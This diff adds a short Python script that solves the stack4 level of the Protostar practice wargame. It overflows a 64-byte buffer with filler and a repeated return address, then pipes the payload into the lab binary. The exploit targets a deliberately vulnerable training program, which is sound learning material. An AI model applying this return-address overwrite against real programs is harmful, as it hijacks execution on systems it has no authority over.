@@ -1,0 +1,8 @@
+#!/usr/bin/env python
+import os
+
+BUFFER = "a" * 64
+EXPLOIT = BUFFER + "\xf4\x83\x04\x08" * 4
+os.environ["EXPLOIT"] = EXPLOIT
+
+os.system("echo $EXPLOIT | /opt/protostar/bin/stack4")
